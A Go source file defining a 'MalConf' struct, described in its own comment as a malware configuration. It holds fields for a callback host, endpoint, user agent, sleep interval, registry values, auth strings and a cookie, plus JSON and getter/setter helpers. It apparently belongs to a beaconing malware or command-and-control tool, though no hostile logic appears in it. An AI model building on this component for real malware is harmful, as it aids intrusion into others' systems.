package util

import "encoding/json"

// MalConf is the struct that contains the malware configuration
type MalConf struct {
	Host     string `json:"Host"`
	Endpoint string `json:"Endpoint"`
	UserA    string `json:"UserAgent"`
	Sleep    int    `json:"Sleep"`
	Reg1     string `json:"Reg1"`
	Reg2     string `json:"Reg2"`
	Auth1    string `json:"Auth1"`
	Auth2    string `json:"Auth2"`
	Cookie   string `json:"Cookie"`
}

func NewMalConf() *MalConf {
	return &MalConf{}
}

func MalConfUnmarshalJSON(j []byte) (*MalConf, error) {
	iniCheck := NewMalConf()
	err := json.Unmarshal(j, &iniCheck)
	if err != nil {
		return &MalConf{}, err
	}
	return iniCheck, nil
}

func MalConfMarshalJSON(m *MalConf) ([]byte, error) {
	j, err := json.Marshal(m)
	if err != nil {
		return nil, err
	}
	return j, nil
}

func (M *MalConf) GetHost() string {
	return M.Host
}

func (M *MalConf) SetHost(h string) {
	M.Host = h
}

func (M *MalConf) GetEndPoint() string {
	return M.Endpoint
}

func (M *MalConf) SetEndPoint(e string) {
	M.Endpoint = e
}

func (M *MalConf) GetUserA() string {
	return M.UserA
}

func (M *MalConf) SetUserA(u string) {
	M.UserA = u
}

func (M *MalConf) GetSleep() int {
	return M.Sleep
}

func (M *MalConf) SetSleep(s int) {
	M.Sleep = s
}

func (M *MalConf) GetReg1() string {
	return M.Reg1
}

func (M *MalConf) SetReg1(r string) {
	M.Reg1 = r
}

func (M *MalConf) GetReg2() string {
	return M.Reg2
}

func (M *MalConf) SetReg2(r string) {
	M.Reg2 = r
}

func (M *MalConf) GetAuth1() string {
	return M.Auth1
}

func (M *MalConf) SetAuth1(a string) {
	M.Auth1 = a
}

func (M *MalConf) GetAuth2() string {
	return M.Auth2
}

func (M *MalConf) SetAuth2(a string) {
	M.Auth2 = a
}

func (M *MalConf) GetCookie() string {
	return M.Cookie
}

func (M *MalConf) SetCookie(c string) {
	M.Cookie = c
}
